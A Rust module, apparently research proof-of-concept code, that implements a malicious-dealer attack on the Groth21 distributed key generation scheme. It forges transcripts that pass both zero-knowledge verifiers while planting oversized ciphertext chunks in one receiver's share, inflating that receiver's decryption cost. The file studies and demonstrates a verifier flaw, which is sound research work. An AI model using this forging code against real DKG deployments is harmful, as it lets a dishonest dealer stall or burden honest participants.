//! Malicious-dealer attack: install a chunk of size $c \approx Z/E$ in one receiver's
//! share, while still producing a transcript that passes both `NIZK.VerSh` and
//! `NIZK.VerChunk`.
//!
//! Two orthogonal facts make this attack work:
//!
//! 1. The verifier never checks the blinder $\sigma_k$'s distribution — only
//!    sees the commitment $C_k = \beta_k\cdot y_0 + \sigma_k\cdot G_1$. Picking
//!    $\sigma_k = 0$ bypasses rejection sampling.
//! 2. The verifier never checks that plaintext chunks lie in $[0, B-1]$ — only
//!    the approximate-range bound $z_{s,k}\in[0,Z-1]$. A dealer can install an
//!    oversized "digit" in one position of one share's radix-$B$ expansion and
//!    satisfy the verifier's arithmetic identities by construction.
//!
//! The largest attack-compatible chunk is
//! $$c = \lfloor (Z - 1 - S) / (E - 1) \rfloor \approx Z/E,$$
//! roughly a factor of $E$ above the honest chunk bound $B-1$. For DFINITY
//! parameters ($n=40, m=16, B=2^{16}, E=256, \ell=32$) that's ~$2^{31}$ vs $2^{16}$,
//! a ~15-bit blow-up per chunk, translating to ~20 bits of extra BSGS cost on
//! the receiver.
//!
//! Requires `sc.t() >= 2` (we need at least one free polynomial coefficient
//! besides the pinned $a_0$ to place $p(1) = c$).

use std::ops::{Add, Mul};

use blstrs::{G1Projective, G2Projective, Scalar};
use ff::Field;
use group::Group;
use rand_core::{CryptoRng, RngCore};

use crate::math::fft::fft;
use crate::math::scalar::random_scalar;

use super::chunking::{PlaintextChunks, CHUNK_SIZE, NUM_CHUNKS};
use super::encryption::enc_chunks;
use super::nizk_chunking::{
    prove_chunking_zero_sigma, ChunkingWitness, CHALLENGE_MASK, NUM_ZK_REPETITIONS,
};
use super::nizk_sharing::{prove_sharing, SharingWitness};
use super::{PublicParameters, Transcript};

/// Upper bound on the malicious chunk the $\sigma_k = 0$ attack can install:
/// $\lfloor (Z-1-S) / (E-1) \rfloor$.
pub fn max_malicious_chunk(n: usize) -> u64 {
    let m = NUM_CHUNKS;
    let b = CHUNK_SIZE;
    let e_minus_1 = CHALLENGE_MASK;
    let ss = (n * m * (b - 1) * e_minus_1) as u64;
    let zz = 2u64 * (NUM_ZK_REPETITIONS as u64) * ss;
    (zz - 1 - ss) / (e_minus_1 as u64)
}

/// Produce a Groth21 transcript with an **oversized chunk** (`c`) installed on
/// receiver 0, while still passing [`crate::groth21::Groth21::verify`].
///
/// - `a_0`: the dealer's pinned secret (for fresh DKG, anything; for resharing,
///   the dealer's existing share from the previous epoch).
/// - `c`: the malicious chunk value. Must satisfy `c <= max_malicious_chunk(pp.n())`.
///
/// Targets receiver 0 specifically (i.e., the evaluation point $\omega^0 = 1$).
/// All other receivers are chunked honestly.
pub fn malicious_deal<R: RngCore + CryptoRng>(
    pp: &PublicParameters,
    a_0: Scalar,
    c: u64,
    rng: &mut R,
) -> Transcript {
    let sc = pp.sharing_config();
    let t = sc.get_threshold();
    let n = sc.get_total_num_players();
    assert!(t >= 2, "malicious_deal requires t >= 2");
    let c_max = max_malicious_chunk(n);
    assert!(c <= c_max, "malicious chunk too large: {} > {}", c, c_max);

    // Design polynomial f of degree t-1 such that:
    //   f(0)       = a_0                 (the pinned secret)
    //   f(omega^0) = f(1) = c_scalar     (target receiver 0 gets value c)
    //
    // Two linear constraints on t coefficients. Randomize f[2..t] and solve for f[1]:
    //   f[0] = a_0
    //   f[0] + f[1] + f[2] + ... + f[t-1] = c_scalar
    //   => f[1] = c_scalar - a_0 - sum_{k>=2} f[k]
    let c_scalar = Scalar::from(c);
    let mut f = vec![Scalar::ZERO; t];
    f[0] = a_0;
    for k in 2..t {
        f[k] = random_scalar(rng);
    }
    let mut sum_others = a_0;
    for k in 2..t {
        sum_others += f[k];
    }
    f[1] = c_scalar - sum_others;

    // No masking (Pedersen-style r = 0).
    let r = vec![Scalar::ZERO; t];

    // Evaluate f and r at the FFT domain (omega^0, omega^1, ..., omega^{N-1}).
    let mut f_evals = fft(&f, sc.get_evaluation_domain());
    f_evals.truncate(n);
    let mut r_evals = fft(&r, sc.get_evaluation_domain());
    r_evals.truncate(n);
    debug_assert_eq!(f_evals[0], c_scalar, "f_evals[0] should equal c");

    // Pedersen commitments to every share.
    let mut coms_g1: Vec<G1Projective> = Vec::with_capacity(n);
    let mut coms_g2: Vec<G2Projective> = Vec::with_capacity(n);
    for i in 0..n {
        let scalars = [f_evals[i], r_evals[i]];
        coms_g1.push(G1Projective::multi_exp(pp.g1_bases(), &scalars));
        coms_g2.push(G2Projective::multi_exp(pp.g2_bases(), &scalars));
    }

    // Malicious radix-B decomposition for receiver 0: one oversized digit, rest zero.
    // The scalar this decomposition recombines to is sum_j B^j * chunks[j] = c * 1 = c,
    // matching f_evals[0] = c, so `NIZK.VerSh`'s scalar-recombination identity holds.
    let mut plaintext_chunks: Vec<PlaintextChunks> = Vec::with_capacity(n);
    for i in 0..n {
        if i == 0 {
            let mut chunks = [0isize; NUM_CHUNKS];
            chunks[0] = c as isize;
            plaintext_chunks.push(PlaintextChunks { chunks });
        } else {
            plaintext_chunks.push(PlaintextChunks::from_scalar(&f_evals[i]));
        }
    }

    // ElGamal-encrypt the (malicious) chunks.
    let (ciphertext, enc_witness) = enc_chunks(pp.encryption_keys(), &plaintext_chunks, rng);

    // Chunking NIZK with sigma_k = 0 — one shot, no rejection loop.
    let big_chunks: Vec<_> = plaintext_chunks.iter().map(|p| p.chunks_as_scalars()).collect();
    let chunking_witness = ChunkingWitness::new(enc_witness.scalars_r, big_chunks);
    let chunk_proof =
        prove_chunking_zero_sigma(pp.encryption_keys(), &ciphertext, &chunking_witness, rng);

    // Sharing NIZK is run honestly — its witness is the polynomial evaluations,
    // which match the ciphertext's scalar interpretation by construction above.
    let r_a = enc_witness.r_0;
    let r_b = random_scalar(rng);
    let g1 = G1Projective::generator();
    let r_bb = g1.mul(&r_b);
    let h = pp.h1();
    let enc_rr: Vec<G1Projective> = r_evals
        .iter()
        .zip(pp.encryption_keys().iter())
        .map(|(r, pk)| h.mul(r).add(pk.mul(&r_b)))
        .collect();
    let enc_ss: Vec<G1Projective> = f_evals
        .iter()
        .zip(pp.encryption_keys().iter())
        .map(|(s, pk)| g1.mul(s).add(pk.mul(&r_a)))
        .collect();
    let r_aa = g1.mul(&r_a);
    let share_witness = SharingWitness::new(r_a, r_b, f_evals.clone(), r_evals.clone());
    let share_proof = prove_sharing(
        &h,
        &coms_g1,
        pp.encryption_keys(),
        &r_aa,
        &enc_ss,
        &r_bb,
        &enc_rr,
        &share_witness,
        rng,
    );

    Transcript {
        coms_g1,
        coms_g2,
        ciphertext,
        chunk_proof,
        r_bb,
        enc_rr,
        share_proof,
    }
}

/// Upper bound on the per-chunk magnitude when **all $m$ chunks of share 1** are
/// inflated to the same value $c$:
///
/// $$c = \left\lfloor\frac{Z - 1 - (E-1)(n-1)m(B-1)}{(E-1)\, m}\right\rfloor$$
///
/// Per-chunk this is a factor of $\approx m$ smaller than [`max_malicious_chunk`]'s
/// single-chunk $Z/E$ bound, but the total BSGS cost on the victim share grows
/// by $\sqrt{m}$ since $m$ chunks are inflated instead of one.
pub fn max_malicious_chunk_full_share(n: usize) -> u64 {
    let m = NUM_CHUNKS;
    let b = CHUNK_SIZE;
    let e_minus_1 = CHALLENGE_MASK;
    let ss = (n * m * (b - 1) * e_minus_1) as u64;
    let zz = 2u64 * (NUM_ZK_REPETITIONS as u64) * ss;
    let numerator = zz - 1 - (e_minus_1 as u64) * ((n - 1) as u64) * (m as u64) * ((b - 1) as u64);
    let denominator = (e_minus_1 as u64) * (m as u64);
    numerator / denominator
}

/// Produce a Groth21 transcript where **all $m$ chunks of share 1 are inflated to
/// the same value $c$**, while still passing [`crate::groth21::Groth21::verify`].
///
/// Contrast [`malicious_deal`], which concentrates the chunk-mass budget on a
/// single chunk (larger $c$ but smaller total decryption cost). This variant
/// spreads the budget across all $m$ chunks of share 1 — smaller per-chunk $c$,
/// but $\sqrt{m}\times$ more total BSGS cost on the victim.
///
/// - `a_0`: the dealer's pinned secret.
/// - `c`: the per-chunk value. Must satisfy `c <= max_malicious_chunk_full_share(pp.n())`.
///
/// Requires `pp.t() >= 2`.
pub fn malicious_deal_full_share<R: RngCore + CryptoRng>(
    pp: &PublicParameters,
    a_0: Scalar,
    c: u64,
    rng: &mut R,
) -> Transcript {
    let sc = pp.sharing_config();
    let t = sc.get_threshold();
    let n = sc.get_total_num_players();
    assert!(t >= 2, "malicious_deal_full_share requires t >= 2");
    let c_max = max_malicious_chunk_full_share(n);
    assert!(c <= c_max, "malicious chunk too large: {} > {}", c, c_max);

    // Target s_1 = p(1) = c * sum_{j=0}^{m-1} B^j (mod p), so that the malicious
    // chunking (c, c, ..., c) recombines to s_1 under radix-B.
    let c_scalar = Scalar::from(c);
    let b_scalar = Scalar::from(CHUNK_SIZE as u64);
    let mut b_power = Scalar::ONE;
    let mut sum_b_powers = Scalar::ZERO;
    for _ in 0..NUM_CHUNKS {
        sum_b_powers += b_power;
        b_power *= b_scalar;
    }
    let s_1 = c_scalar * sum_b_powers;

    // Polynomial of degree t-1 with f(0) = a_0, f(omega^0) = f(1) = s_1.
    // Randomize f[2..t], solve for f[1]. Requires t >= 2.
    let mut f = vec![Scalar::ZERO; t];
    f[0] = a_0;
    for k in 2..t {
        f[k] = random_scalar(rng);
    }
    let mut sum_others = a_0;
    for k in 2..t {
        sum_others += f[k];
    }
    f[1] = s_1 - sum_others;

    let r = vec![Scalar::ZERO; t];

    let mut f_evals = fft(&f, sc.get_evaluation_domain());
    f_evals.truncate(n);
    let mut r_evals = fft(&r, sc.get_evaluation_domain());
    r_evals.truncate(n);
    debug_assert_eq!(f_evals[0], s_1, "f_evals[0] should equal s_1");

    let mut coms_g1: Vec<G1Projective> = Vec::with_capacity(n);
    let mut coms_g2: Vec<G2Projective> = Vec::with_capacity(n);
    for i in 0..n {
        let scalars = [f_evals[i], r_evals[i]];
        coms_g1.push(G1Projective::multi_exp(pp.g1_bases(), &scalars));
        coms_g2.push(G2Projective::multi_exp(pp.g2_bases(), &scalars));
    }

    // Receiver 0: all m chunks = c. Others: canonical radix-B decomposition.
    let mut plaintext_chunks: Vec<PlaintextChunks> = Vec::with_capacity(n);
    for i in 0..n {
        if i == 0 {
            let chunks = [c as isize; NUM_CHUNKS];
            plaintext_chunks.push(PlaintextChunks { chunks });
        } else {
            plaintext_chunks.push(PlaintextChunks::from_scalar(&f_evals[i]));
        }
    }

    let (ciphertext, enc_witness) = enc_chunks(pp.encryption_keys(), &plaintext_chunks, rng);

    let big_chunks: Vec<_> = plaintext_chunks.iter().map(|p| p.chunks_as_scalars()).collect();
    let chunking_witness = ChunkingWitness::new(enc_witness.scalars_r, big_chunks);
    let chunk_proof =
        prove_chunking_zero_sigma(pp.encryption_keys(), &ciphertext, &chunking_witness, rng);

    let r_a = enc_witness.r_0;
    let r_b = random_scalar(rng);
    let g1 = G1Projective::generator();
    let r_bb = g1.mul(&r_b);
    let h = pp.h1();
    let enc_rr: Vec<G1Projective> = r_evals
        .iter()
        .zip(pp.encryption_keys().iter())
        .map(|(r, pk)| h.mul(r).add(pk.mul(&r_b)))
        .collect();
    let enc_ss: Vec<G1Projective> = f_evals
        .iter()
        .zip(pp.encryption_keys().iter())
        .map(|(s, pk)| g1.mul(s).add(pk.mul(&r_a)))
        .collect();
    let r_aa = g1.mul(&r_a);
    let share_witness = SharingWitness::new(r_a, r_b, f_evals.clone(), r_evals.clone());
    let share_proof = prove_sharing(
        &h,
        &coms_g1,
        pp.encryption_keys(),
        &r_aa,
        &enc_ss,
        &r_bb,
        &enc_rr,
        &share_witness,
        rng,
    );

    Transcript {
        coms_g1,
        coms_g2,
        ciphertext,
        chunk_proof,
        r_bb,
        enc_rr,
        share_proof,
    }
}
